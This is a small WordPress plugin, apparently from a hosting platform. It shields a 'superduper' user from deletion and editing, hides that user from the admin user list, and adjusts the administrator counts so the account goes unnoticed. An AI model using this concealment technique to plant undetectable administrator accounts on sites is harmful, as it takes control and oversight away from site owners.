<?php
/**
 * @package waas1-superduper-related
 */
/*
Plugin Name: waas1-superduper-related
Plugin URI: https://waas1.com/
Description: superduper user related functions
Version: 1.0.0
Author: Erfan
Author URI: https://waas1.com/
License: GPLv2 or later
*/


// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}


//if the call is from "wp-cli" don't run the code below
if ( defined( 'WP_CLI' ) && WP_CLI ) {
	return;
}


//do not allow to delete superduper
add_action( 'delete_user', function( $id ) {
	
	$user = get_user_by( 'id', $id );
	
	if( $user->user_login == 'superduper' ){ //do not allow to delete if user = "superduper"
		wp_redirect( admin_url() );
        exit();
	}
	
});



//do not allow to update the user
add_filter ( 'wp_pre_insert_user_data', function( $data, $update, $id ){
	
	$currentLoggedInUser = wp_get_current_user();
	if( $currentLoggedInUser->data->user_login == 'superduper' ){
		return $data;
	}
	
	$user = get_user_by( 'id', $id );
	if( $update == true ){

		if( $user->user_login == 'superduper' ){ //do not allow to update if user = "superduper"
			wp_redirect( admin_url() );
			exit();
		}
		
	}
	
	return $data;

	
}, 10, 3);




//Hide superduper user from the list
add_action( 'pre_user_query', function( $user_search ){
	
	global $current_user;
	if( $current_user->user_login == 'superduper' ){
		return $user_search;
	}
	
	global $wpdb;
	$user_search->query_where = str_replace( 'WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'superduper'", $user_search->query_where );

  
});



//fix administrator counts from the table list view
add_filter( 'views_users', function($views){
	
	$currentLoggedInUser = wp_get_current_user();
	if( $currentLoggedInUser->data->user_login == 'superduper' ){
		return $views;
	}
	
	
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator'] - 1;
	$all_num = $users['total_users'] - 1;
	$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
	$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
	return $views;
	
});





?>